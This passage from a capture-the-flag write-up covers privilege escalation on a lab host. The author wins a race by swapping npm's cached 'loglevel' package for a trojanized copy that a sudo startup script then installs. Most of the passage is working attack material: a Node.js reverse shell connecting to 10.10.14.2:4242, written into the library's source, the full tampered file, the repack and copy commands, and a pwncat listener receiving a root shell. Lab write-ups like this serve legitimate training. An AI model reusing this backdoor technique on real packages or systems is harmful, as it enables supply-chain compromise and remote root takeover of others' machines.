[=] Checking for loglevel
[+] Installing loglevel
/opt/app
├── loglevel@1.8.0 
└── mysql@2.18.1 

[+] Starting the app
```

Ok I've found the package in the ```.npm``` folder within ```kavis``` home directory but while I browsed to it, it got deleted. So we are talking about a ```race condition```.

```
kavi@seventeen:~/.npm/loglevel/1.8.0/package$ cd ..
cd: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
```

I've spun up the script again  and with a second SSH session I've copied the package to the home directory:

```
kavi@seventeen:/$ cp -r ~/.npm/loglevel ~
kavi@seventeen:/$ ls ~
loglevel
```

I've decompressed the ```package.tgz``` and edited the ```/lib/loglevel.js``` where I injected a nodejs revershell from revshells.com on the top
```
kavi@seventeen:~/loglevel/1.8.0$ head -n 30 package/lib/loglevel.js 
/*
* loglevel - https://github.com/pimterry/loglevel
*
* Copyright (c) 2013 Tim Perry
* Licensed under the MIT license.
*/
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.10.14.2", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();

(function (root, definition) {
    "use strict";
    if (typeof define === 'function' && define.amd) {
        define(definition);
    } else if (typeof module === 'object' && module.exports) {
        module.exports = definition();
    } else {
        root.log = definition();
    }
}(this, function () {
    "use strict";
```

I've repacked the package:
```
kavi@seventeen:~/loglevel/1.8.0$ rm package.tgz 
kavi@seventeen:~/loglevel/1.8.0$ tar -cvzf package.tgz package/
package/
package/dist/
package/dist/loglevel.min.js
package/dist/loglevel.js
package/CONTRIBUTING.md
package/package.json
package/bower.json
package/lib/
package/lib/loglevel.js
package/lib/.jshintrc
package/.github/
package/.github/FUNDING.yml
package/.editorconfig
package/_config.yml
package/Gruntfile.js
package/.travis.yml
package/LICENSE-MIT
package/index.d.ts
package/.jshintrc
package/test/
package/test/manual-test.html
package/test/global-integration.js
package/test/test-qunit.html
package/test/method-factory-test.js
package/test/get-current-level-test.js
package/test/integration-smoke-test.js
package/test/cookie-test.js
package/test/vendor/
package/test/vendor/json2.js
package/test/global-integration-with-new-context.js
package/test/multiple-logger-test.js
package/test/type-test.ts
package/test/test-context-using-apply.js
package/test/console-fallback-test.js
package/test/level-setting-test.js
package/test/test-helpers.js
package/test/default-level-test.js
package/test/.jshintrc
package/test/test-qunit.js
package/test/local-storage-test.js
package/test/node-integration.js
package/README.md
```
Okay so now the package gets confirmed as installed but  did not recieve a reverse shell back.

```
kavi@seventeen:~$ sudo /opt/app/startup.sh 
[=] Checking for db-logger
[+] db-logger already installed
[=] Checking for loglevel
[+] loglevel already installed
[+] Starting the app
```

#### Winning the Race

Open 3 SSH sessions as ```kavi``` on ```seventeen```.

With the **first** session start the script 
```
kavi@seventeen:/opt/app$ sudo /opt/app/startup.sh 
[sudo] password for kavi: 
[=] Checking for db-logger

[+] db-logger already installed
[=] Checking for loglevel
[+] Installing loglevel
/opt/app
├── loglevel@1.8.0 
└── mysql@2.18.1 

[+] Starting the app
```
With the **second** session create a folder and copy the npm package into it:
```
kavi@seventeen:~$ cd repack/
kavi@seventeen:~/repack$ cp -R ~/.npm/loglevel/1.8.0 .
```

Decompress the package.tgz
```
kavi@seventeen:~/repack$ tar -xvf package.tgz 
package/.editorconfig
package/.jshintrc
package/lib/.jshintrc
package/test/.jshintrc
package/LICENSE-MIT
package/test/manual-test.html
package/test/test-qunit.html
package/test/console-fallback-test.js
package/test/cookie-test.js
package/test/default-level-test.js
package/test/get-current-level-test.js
package/test/global-integration-with-new-context.js
package/test/global-integration.js
package/Gruntfile.js
package/test/integration-smoke-test.js
package/test/vendor/json2.js
package/test/level-setting-test.js
package/test/local-storage-test.js
package/dist/loglevel.js
package/lib/loglevel.js
package/dist/loglevel.min.js
package/test/method-factory-test.js
package/test/multiple-logger-test.js
package/test/node-integration.js
package/test/test-context-using-apply.js
package/test/test-helpers.js
package/test/test-qunit.js
package/bower.json
package/package.json
package/CONTRIBUTING.md
package/README.md
package/index.d.ts
package/test/type-test.ts
package/_config.yml
package/.travis.yml
package/.github/FUNDING.yml
T
package/test/manual-test.html
package/test/test-qunit.html
package/test/console-fallback-test.js
package/test/cookie-test.js
package/test/default-level-test.js
package/test/get-current-level-test.js
package/test/global-integration-with-new-context.js
package/test/global-integration.js
package/Gruntfile.js
package/test/integration-smoke-test.js
package/test/vendor/json2.js
package/test/level-setting-test.js
package/test/local-storage-test.js
package/dist/loglevel.js
package/lib/loglevel.js
package/dist/loglevel.min.js
package/test/method-factory-test.js
package/test/multiple-logger-test.js
package/test/node-integration.js
package/test/test-context-using-apply.js
package/test/test-helpers.js
package/test/test-qunit.js
package/bower.json
package/package.json
package/CONTRIBUTING.md
package/README.md
package/index.d.ts
package/test/type-test.ts
package/_config.yml
package/.travis.yml
package/.github/FUNDING.yml
```



Add the node.js Revershell from revshells.com at the End of the loglevel.js
```
kavi@seventeen:~/repack$ nano ~/repack/package/lib/loglevel.js 
```
```c
kavi@seventeen:~/repack/package/lib$ cat loglevel.js 
/*
* loglevel - https://github.com/pimterry/loglevel
*
* Copyright (c) 2013 Tim Perry
* Licensed under the MIT license.
*/
(function (root, definition) {
    "use strict";
    if (typeof define === 'function' && define.amd) {
        define(definition);
    } else if (typeof module === 'object' && module.exports) {
        module.exports = definition();
    } else {
        root.log = definition();
    }
}(this, function () {
    "use strict";

    // Slightly dubious tricks to cut down minimized file size
    var noop = function() {};
    var undefinedType = "undefined";
    var isIE = (typeof window !== undefinedType) && (typeof window.navigator !== undefinedType) && (
        /Trident\/|MSIE /.test(window.navigator.userAgent)
    );

    var logMethods = [
        "trace",
        "debug",
        "info",
        "warn",
        "error"
    ];

    // Cross-browser bind equivalent that works at least back to IE6
    function bindMethod(obj, methodName) {
        var method = obj[methodName];
        if (typeof method.bind === 'function') {
            return method.bind(obj);
        } else {
            try {
                return Function.prototype.bind.call(method, obj);
            } catch (e) {
                // Missing bind shim or IE8 + Modernizr, fallback to wrapping
                return function() {
                    return Function.prototype.apply.apply(method, [obj, arguments]);
                };
            }
        }
    }

    // Trace() doesn't print the message in IE, so for that case we need to wrap it
    function traceForIE() {
        if (console.log) {
            if (console.log.apply) {
                console.log.apply(console, arguments);
            } else {
                // In old IE, native console methods themselves don't have apply().
                Function.prototype.apply.apply(console.log, [console, arguments]);
            }
        }
        if (console.trace) console.trace();
    }

    // Build the best logging method possible for this env
    // Wherever possible we want to bind, not wrap, to preserve stack traces
    function realMethod(methodName) {
        if (methodName === 'debug') {
            methodName = 'log';
        }

        if (typeof console === undefinedType) {
            return false; // No method possible, for now - fixed later by enableLoggingWhenConsoleArrives
        } else if (methodName === 'trace' && isIE) {
            return traceForIE;
        } else if (console[methodName] !== undefined) {
            return bindMethod(console, methodName);
        } else if (console.log !== undefined) {
            return bindMethod(console, 'log');
        } else {
            return noop;
        }
    }

    // These private functions always need `this` to be set properly

    function replaceLoggingMethods(level, loggerName) {
        /*jshint validthis:true */
        for (var i = 0; i < logMethods.length; i++) {
            var methodName = logMethods[i];
            this[methodName] = (i < level) ?
                noop :
                this.methodFactory(methodName, level, loggerName);
        }

        // Define log.log as an alias for log.debug
        this.log = this.debug;
    }

    // In old IE versions, the console isn't present until you first open it.
    // We build realMethod() replacements here that regenerate logging methods
    function enableLoggingWhenConsoleArrives(methodName, level, loggerName) {
        return function () {
            if (typeof console !== undefinedType) {
                replaceLoggingMethods.call(this, level, loggerName);
                this[methodName].apply(this, arguments);
            }
        };
    }

    // By default, we use closely bound real methods wherever possible, and
    // otherwise we wait for a console to appear, and then try again.
    function defaultMethodFactory(methodName, level, loggerName) {
        /*jshint validthis:true */
        return realMethod(methodName) ||
               enableLoggingWhenConsoleArrives.apply(this, arguments);
    }

    function Logger(name, defaultLevel, factory) {
      var self = this;
      var currentLevel;
      defaultLevel = defaultLevel == null ? "WARN" : defaultLevel;

      var storageKey = "loglevel";
      if (typeof name === "string") {
        storageKey += ":" + name;
      } else if (typeof name === "symbol") {
        storageKey = undefined;
      }

      function persistLevelIfPossible(levelNum) {
          var levelName = (logMethods[levelNum] || 'silent').toUpperCase();

          if (typeof window === undefinedType || !storageKey) return;

          // Use localStorage if available
          try {
              window.localStorage[storageKey] = levelName;
              return;
          } catch (ignore) {}

          // Use session cookie as fallback
          try {
              window.document.cookie =
                encodeURIComponent(storageKey) + "=" + levelName + ";";
          } catch (ignore) {}
      }

      function getPersistedLevel() {
          var storedLevel;

          if (typeof window === undefinedType || !storageKey) return;

          try {
              storedLevel = window.localStorage[storageKey];
          } catch (ignore) {}

          // Fallback to cookies if local storage gives us nothing
          if (typeof storedLevel === undefinedType) {
              try {
                  var cookie = window.document.cookie;
                  var location = cookie.indexOf(
                      encodeURIComponent(storageKey) + "=");
                  if (location !== -1) {
                      storedLevel = /^([^;]+)/.exec(cookie.slice(location))[1];
                  }
              } catch (ignore) {}
          }

          // If the stored level is not valid, treat it as if nothing was stored.
          if (self.levels[storedLevel] === undefined) {
              storedLevel = undefined;
          }

          return storedLevel;
      }

      function clearPersistedLevel() {
          if (typeof window === undefinedType || !storageKey) return;

          // Use localStorage if available
          try {
              window.localStorage.removeItem(storageKey);
              return;
          } catch (ignore) {}

          // Use session cookie as fallback
          try {
              window.document.cookie =
                encodeURIComponent(storageKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC";
          } catch (ignore) {}
      }

      /*
       *
       * Public logger API - see https://github.com/pimterry/loglevel for details
       *
       */

      self.name = name;

      self.levels = { "TRACE": 0, "DEBUG": 1, "INFO": 2, "WARN": 3,
          "ERROR": 4, "SILENT": 5};

      self.methodFactory = factory || defaultMethodFactory;

      self.getLevel = function () {
          return currentLevel;
      };

      self.setLevel = function (level, persist) {
          if (typeof level === "string" && self.levels[level.toUpperCase()] !== undefined) {
              level = self.levels[level.toUpperCase()];
          }
          if (typeof level === "number" && level >= 0 && level <= self.levels.SILENT) {
              currentLevel = level;
              if (persist !== false) {  // defaults to true
                  persistLevelIfPossible(level);
              }
              replaceLoggingMethods.call(self, level, name);
              if (typeof console === undefinedType && level < self.levels.SILENT) {
                  return "No console available for logging";
              }
          } else {
              throw "log.setLevel() called with invalid level: " + level;
          }
      };

      self.setDefaultLevel = function (level) {
          defaultLevel = level;
          if (!getPersistedLevel()) {
              self.setLevel(level, false);
          }
      };

      self.resetLevel = function () {
          self.setLevel(defaultLevel, false);
          clearPersistedLevel();
      };

      self.enableAll = function(persist) {
          self.setLevel(self.levels.TRACE, persist);
      };

      self.disableAll = function(persist) {
          self.setLevel(self.levels.SILENT, persist);
      };

      // Initialize with the right level
      var initialLevel = getPersistedLevel();
      if (initialLevel == null) {
          initialLevel = defaultLevel;
      }
      self.setLevel(initialLevel, false);
    }

    /*
     *
     * Top-level API
     *
     */

    var defaultLogger = new Logger();

    var _loggersByName = {};
    defaultLogger.getLogger = function getLogger(name) {
        if ((typeof name !== "symbol" && typeof name !== "string") || name === "") {
          throw new TypeError("You must supply a name when creating a logger.");
        }

        var logger = _loggersByName[name];
        if (!logger) {
          logger = _loggersByName[name] = new Logger(
            name, defaultLogger.getLevel(), defaultLogger.methodFactory);
        }
        return logger;
    };

    // Grab the current global log variable in case of overwrite
    var _log = (typeof window !== undefinedType) ? window.log : undefined;
    defaultLogger.noConflict = function() {
        if (typeof window !== undefinedType &&
               window.log === defaultLogger) {
            window.log = _log;
        }

        return defaultLogger;
    };

    defaultLogger.getLoggers = function getLoggers() {
        return _loggersByName;
    };

    // ES6 default export, for compatibility
    defaultLogger['default'] = defaultLogger;

    return defaultLogger;
}));
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.10.14.2", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

Create the new ```gunzip tarball```:
```
kavi@seventeen:~/repack$ tar -cvzf package.tgz package 
package/
package/dist/
package/dist/loglevel.min.js
package/dist/loglevel.js
package/CONTRIBUTING.md
package/package.json
package/bower.json
package/lib/
package/lib/loglevel.js
package/lib/.jshintrc
package/.github/
package/.github/FUNDING.yml
package/.editorconfig
package/_config.yml
package/Gruntfile.js
package/.travis.yml
package/LICENSE-MIT
package/index.d.ts
package/.jshintrc
package/test/
package/test/manual-test.html
package/test/global-integration.js
package/test/test-qunit.html
package/test/method-factory-test.js
package/test/get-current-level-test.js
package/test/integration-smoke-test.js
package/test/cookie-test.js
package/test/vendor/
package/test/vendor/json2.js
package/test/global-integration-with-new-context.js
package/test/multiple-logger-test.js
package/test/type-test.ts
package/test/test-context-using-apply.js
package/test/console-fallback-test.js
package/test/level-setting-test.js
package/test/test-helpers.js
package/test/default-level-test.js
package/test/.jshintrc
package/test/test-qunit.js
package/test/local-storage-test.js
package/test/node-integration.js
package/README.md
```

With the **third** SSH session watch for the deletion of the package:
```
kavi@seventeen:~$ watch -n 1 ls ~/.npm
```

As soon as it gets deleted copy your malicous packet folder into the .nom folder with the **second** session:

```
kavi@seventeen:~/repack$ cp -R . ~/.npm/loglevel/1.8.0 
```

Back on the **first** session restart the script:
```
kavi@seventeen:/opt/app$ sudo /opt/app/startup.sh 
[=] Checking for db-logger
[+] db-logger already installed
[=] Checking for loglevel
[+] Installing loglevel
/opt/app
├── loglevel@1.8.0 
└── mysql@2.18.1 

[+] Starting the app
```
Catch the shell and profit!
```
┌──(luca㉿kali)-[~]
└─$ /home/luca/.local/bin/pwncat-cs -lp 4242
[00:05:49] Welcome to pwncat 🐈!                                                                                                             __main__.py:164
[00:15:02] received connection from 10.10.11.165:56244                                                                                            bind.py:84
[00:15:03] 0.0.0.0:4242: upgrading from /bin/dash to /bin/bash                                                                                manager.py:957
           10.10.11.165:56244: registered new host w/ db                                                                                      manager.py:957
(local) pwncat$ cat /root/root.txt
[00:15:13] error: cat: unknown command                                                                                                        manager.py:957
(local) pwncat$                                                                                                                                             
(remote) root@seventeen:/opt/app# cat /root/root.txt
```
